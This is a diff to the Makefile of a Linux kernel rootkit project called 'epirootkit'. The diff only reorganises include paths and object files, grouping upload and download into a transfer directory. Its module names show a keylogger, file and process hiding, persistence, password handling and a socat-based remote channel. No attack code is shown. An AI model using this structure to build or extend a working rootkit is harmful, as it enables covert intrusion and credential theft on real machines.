@@ -4,29 +4,33 @@ PWD       := $(shell pwd)
 ccflags-y := 								    \
     -I$(src) 							        \
     -I$(src)/include 					        \
-    -I$(src)/network/core					    \
+    -I$(src)/transfer/include 					\
     -I$(src)/interceptor/core/include 	        \
     -I$(src)/interceptor/hooks/alterate         \
     -I$(src)/interceptor/hooks/forbid 	        \
     -I$(src)/interceptor/hooks/hide             \
-    -I$(src)/passwd 				            \
     -I$(src)/utils/io 					        \
     -I$(src)/utils/ulist 				        \
-    -I$(src)/persist     				        \
     -I$(src)/utils/crypto                       \
-    -I$(src)/utils/sysinfo                   
+    -I$(src)/utils/sysinfo                      \
+    -I$(src)/network/core					    \
+    -I$(src)/passwd 				            \
+    -I$(src)/persist     				        \
 
 obj-m    := epirootkit.o
 
 epirootkit-objs :=                              \
     main.o                                      \
-    userland.o                                  \
     socat.o                                     \
-    epikeylog.o                                 \
-    cmd.o                                       \
     vanish.o                                    \
+    cmd.o                                       \
+    userland.o                                  \
+    epikeylog.o                                 \
+    utils/io/io.o                               \
 	utils/crypto/hash.o                         \
 	utils/crypto/aes.o                          \
+    utils/ulist/ulist.o                         \
+    utils/sysinfo/sysinfo.o                     \
     network/core/network.o                      \
 	network/protocols/tcp/socket.o              \
     network/protocols/tcp/worker.o              \
@@ -43,12 +47,9 @@ epirootkit-objs :=                              \
     interceptor/hooks/hide/hide.o               \
     interceptor/hooks/hide/hide_api.o           \
     interceptor/misc/ghost.o                    \
-    utils/io/io.o                               \
-    utils/ulist/ulist.o                         \
-    passwd/passwd.o                             \
-    utils/sysinfo/sysinfo.o                     \
-    upload.o                                    \
-    download.o
+    transfer/download.o                         \
+    transfer/upload.o                           \
+    passwd/passwd.o
 
 all: modules
 
